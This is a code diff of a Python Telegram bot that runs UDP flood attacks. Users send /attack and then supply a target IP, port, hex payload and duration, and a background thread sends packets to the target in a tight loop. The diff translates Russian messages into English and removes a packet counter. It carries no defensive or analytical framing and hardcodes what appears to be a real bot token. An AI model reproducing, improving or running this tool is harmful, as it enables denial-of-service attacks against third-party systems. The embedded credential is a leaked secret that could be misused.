@@ -4,7 +4,7 @@ import threading
 import time
 import re
 from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, MessageHandler, filters
 
 TOKEN = "8908217414:AAE5kpUsI6CZgSfybD1VJnrxGHZeYQgpuo8"
 
@@ -20,15 +20,13 @@ def hex_to_bytes(hex_text):
 def attack_worker(chat_id, ip, port, payload, seconds):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end = time.time() + seconds
-    sent = 0
     while time.time() < end and active_attacks.get(chat_id, False):
         sock.sendto(payload, (ip, port))
-        sent += 1
     active_attacks[chat_id] = False
     sock.close()
 
 async def start(update, context):
-    await update.message.reply_text("Бот готов. Отправь /attack")
+    await update.message.reply_text("Bot ready. Send /attack")
 
 async def attack(update, context):
     chat_id = update.effective_chat.id
@@ -40,7 +38,7 @@ async def attack(update, context):
 async def stop(update, context):
     chat_id = update.effective_chat.id
     active_attacks[chat_id] = False
-    await update.message.reply_text("Атака остановлена")
+    await update.message.reply_text("Attack stopped")
 
 async def handle_text(update, context):
     chat_id = update.effective_chat.id
@@ -50,22 +48,22 @@ async def handle_text(update, context):
     if step == 'ip':
         context.user_data['ip'] = text
         context.user_data['step'] = 'port'
-        await update.message.reply_text("Порт:")
+        await update.message.reply_text("Port:")
     elif step == 'port':
         try:
             context.user_data['port'] = int(text)
             context.user_data['step'] = 'hex'
-            await update.message.reply_text("HEX байты (любой формат):")
+            await update.message.reply_text("HEX:")
         except:
-            await update.message.reply_text("Ошибка, введи число:")
+            await update.message.reply_text("Invalid port")
     elif step == 'hex':
         payload = hex_to_bytes(text)
         if not payload:
-            await update.message.reply_text("HEX не распознан, попробуй ещё:")
+            await update.message.reply_text("Invalid HEX")
             return
         context.user_data['payload'] = payload
         context.user_data['step'] = 'seconds'
-        await update.message.reply_text("Секунд атаки:")
+        await update.message.reply_text("Seconds:")
     elif step == 'seconds':
         try:
             seconds = int(text)
@@ -74,10 +72,10 @@ async def handle_text(update, context):
             payload = context.user_data['payload']
             active_attacks[chat_id] = True
             threading.Thread(target=attack_worker, args=(chat_id, ip, port, payload, seconds), daemon=True).start()
-            await update.message.reply_text(f"Атака на {ip}:{port} запущена на {seconds} сек")
+            await update.message.reply_text(f"Attacking {ip}:{port} for {seconds} sec")
             context.user_data.clear()
         except:
-            await update.message.reply_text("Ошибка, введи число:")
+            await update.message.reply_text("Invalid seconds")
 
 def main():
     app = Application.builder().token(TOKEN).build()
